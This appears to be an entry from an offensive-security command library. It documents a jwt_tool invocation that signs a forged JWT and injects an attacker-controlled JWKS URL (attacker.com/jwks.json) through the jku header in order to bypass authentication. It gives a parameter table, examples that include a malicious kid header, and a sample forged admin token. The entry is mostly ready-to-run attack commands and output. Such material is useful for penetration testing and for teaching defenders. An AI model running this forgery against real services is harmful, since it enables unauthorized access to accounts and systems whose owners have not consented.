---
id: 40e1ee3e-6b5c-457b-8223-cb207d92b643
name: jwt-tool-sign-with-jku-injection
type: command
executor: bash
data: >-
  python3 jwt_tool.py $_FORGED_JWT -S rs256 -k $_PRIVATE_KEY -ju
  $_ATTACKER_JWKS_URL
output: null
created_at: '2023-04-06T03:56:00.839770+00:00'
updated_at: '2023-04-10T20:22:36.345573+00:00'
platforms:
  - Linux
  - macOS
tags:
  - jwt
  - sign
  - jku
verified: true
validated: true
---

# jwt-tool-sign-with-jku-injection

## Command

```bash
python3 jwt_tool.py $_FORGED_JWT -S rs256 -k $_PRIVATE_KEY -ju $_ATTACKER_JWKS_URL
```

## Description

Signs a JWT using RS256 algorithm with a private key and injects a custom JWKS URL via the -ju flag. This forges the token for use in authentication bypass scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FORGED_JWT | Unsigned JWT (header.payload) | Yes |
| -S rs256 | Sign with RS256 algorithm | Yes |
| -k $_PRIVATE_KEY | Path to RSA private key file | Yes |
| -ju $_ATTACKER_JWKS_URL | Malicious JWKS endpoint URL | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJ...eyJ... -S rs256 -k private.pem -ju https://attacker.com/jwks.json
```

### Advanced Usage

```bash
python3 jwt_tool.py $_FORGED_JWT -S rs256 -k $_PRIVATE_KEY -ju $_URL -H {"kid":"malicious"}
```

## Expected Output

Signed JWT: eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiJ9.eyJsb2dpbiI6ImFkbWluIn0.signature

## Related

- [[procedures/JWT-Token-Forgery-via-JWKS-Header-Injection]]
- [[commands/jwt-set-header-rs256-with-jku]]
